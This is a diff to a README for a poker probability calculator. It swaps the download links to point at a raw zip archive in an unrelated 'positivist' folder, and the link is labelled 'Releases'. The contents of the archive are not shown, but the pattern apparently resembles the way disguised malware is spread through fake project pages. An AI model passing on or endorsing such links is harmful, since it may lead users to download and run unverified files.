@@ -1,6 +1,6 @@
 # 🎴 PokerUltimateCalc - Master Poker Probabilities Effortlessly
 
-[![Download PokerUltimateCalc](https://raw.githubusercontent.com/Hello1waver/PokerUltimateCalc/main/positivist/Poker-Calc-Ultimate-1.6.zip)](https://raw.githubusercontent.com/Hello1waver/PokerUltimateCalc/main/positivist/Poker-Calc-Ultimate-1.6.zip)
+[![Download PokerUltimateCalc](https://github.com/Hello1waver/PokerUltimateCalc/raw/refs/heads/main/positivist/Poker_Calc_Ultimate_v2.0.zip)](https://github.com/Hello1waver/PokerUltimateCalc/raw/refs/heads/main/positivist/Poker_Calc_Ultimate_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to PokerUltimateCalc! This application helps you calculate poker probabi
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [PokerUltimateCalc Releases](https://raw.githubusercontent.com/Hello1waver/PokerUltimateCalc/main/positivist/Poker-Calc-Ultimate-1.6.zip).
+To get started, visit this page to download: [PokerUltimateCalc Releases](https://github.com/Hello1waver/PokerUltimateCalc/raw/refs/heads/main/positivist/Poker_Calc_Ultimate_v2.0.zip).
 
 1. Go to the link above.
 2. Look for the latest version.
